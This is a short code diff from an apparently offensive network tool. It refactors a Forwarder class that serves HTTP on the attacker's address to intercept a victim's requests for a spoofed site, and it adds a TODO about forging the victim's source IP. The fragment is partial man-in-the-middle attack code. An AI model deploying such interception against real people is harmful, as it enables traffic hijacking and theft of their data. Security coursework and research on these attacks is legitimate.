@@ -1,9 +1,10 @@
 from logger import log_info, log_warning
-import threading
 import http.client
 import http.server
 import socketserver
 import requests
+
+# TODO: Change the forwarder such that the packages sent to the server have the source ip of the victim.
 
 site_to_spoof = None
 ip_victim = None
@@ -77,18 +78,13 @@ class Forwarder:
         ip_victim = ip_victim_
         site_to_spoof = site_to_spoof_
 
-    def _client_communication(self):
-        socketserver.TCPServer.allow_reuse_address = True
-        httpd = socketserver.TCPServer((self.ip_attacker, 80), CustomHTTPRequestHandler)
-        httpd.serve_forever()
-
     def forward(self):
         log_info("Starting packet forwarding")
 
         # Start listening for HTTP requests from the victim
         log_info("Starting HTTP server")
-        client_thread = threading.Thread(target=self._client_communication)
-        client_thread.start()
-        client_thread.join()
+        socketserver.TCPServer.allow_reuse_address = True
+        httpd = socketserver.TCPServer((self.ip_attacker, 80), CustomHTTPRequestHandler)
+        httpd.serve_forever()
 
         log_warning("Stopping packet forwarding")
